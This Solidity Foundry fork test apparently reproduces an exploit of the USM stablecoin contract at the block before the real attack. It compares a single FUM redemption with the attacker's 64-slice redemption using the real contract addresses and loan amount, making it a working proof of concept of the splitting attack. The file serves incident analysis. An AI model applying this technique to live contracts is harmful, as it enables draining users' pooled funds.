// SPDX-License-Identifier: CC0-1.0
pragma solidity 0.8.26;

// Fork de l'etat de la chaine un bloc AVANT la transaction (25716149) : on finance le pool USM avec le montant du pret, puis on rachete TOUT le FUM obtenu
// d'abord en UN SEUL defund, puis (apres retour au meme instantane) en 64 tranches egales comme le fait l'attaquant. Meme bloc, meme horodatage,
// memes contrats reels : la seule difference est le decoupage.
interface Vm {
    function createSelectFork(string calldata, uint256) external returns (uint256);
    function deal(address, uint256) external;
    function snapshotState() external returns (uint256);
    function revertToState(uint256) external returns (bool);
}
interface IUSM {
    function fund(address to, uint256 minFumOut) external payable returns (uint256);
    function defund(address to, uint256 fumToBurn, uint256 minEthOut) external returns (uint256);
    function ethPool() external view returns (uint256);
    function fumTotalSupply() external view returns (uint256);
}
interface IFUM { function balanceOf(address) external view returns (uint256); }

contract Fork {
    Vm constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IUSM constant USM = IUSM(0x2a7FFf44C19f39468064ab5e5c304De01D591675);
    IFUM constant FUM = IFUM(0x86729873e3b88DE2Ab85CA292D6d6D69D548eDF3);
    uint256 constant LOAN = 11_579_978_354_608_392_803_524;
    uint256 constant SLICE = 971_629_672_368_796_643_705_078;
    receive() external payable {}

    function test_split() external {
        vm.createSelectFork("https://eth.drpc.org", 25716149);
        vm.deal(address(this), LOAN);
        uint256 pool0 = USM.ethPool();
        uint256 fum0 = USM.fumTotalSupply();
        uint256 snap = vm.snapshotState();

        // A. une seule redemption
        USM.fund{value: LOAN}(address(this), 0);
        uint256 f = FUM.balanceOf(address(this));
        uint256 one = USM.defund(payable(address(this)), f, 0);
        vm.revertToState(snap);

        // B. 64 tranches comme dans la transaction reelle : 8 tranches de SLICE puis 56 de SLICE + 1 (le total est exactement le FUM obtenu)
        vm.deal(address(this), LOAN);
        USM.fund{value: LOAN}(address(this), 0);
        uint256 f2 = FUM.balanceOf(address(this));
        require(8 * SLICE + 56 * (SLICE + 1) == f2, "slices");
        uint256 total;
        for (uint256 i = 0; i < 64; i++) {
            uint256 amt = i < 8 ? SLICE : SLICE + 1;
            total += USM.defund(payable(address(this)), amt, 0);
        }
        require(false, string(abi.encodePacked("RESULT ", _u(pool0), " ", _u(fum0), " ", _u(f), " ", _u(f2), " ", _u(one), " ", _u(total), " ", _u(address(this).balance))));
    }

    function _u(uint256 x) internal pure returns (string memory) {
        if (x == 0) return "0";
        uint256 n; uint256 t = x;
        while (t != 0) { n++; t /= 10; }
        bytes memory b = new bytes(n);
        while (x != 0) { n--; b[n] = bytes1(uint8(48 + x % 10)); x /= 10; }
        return string(b);
    }
}
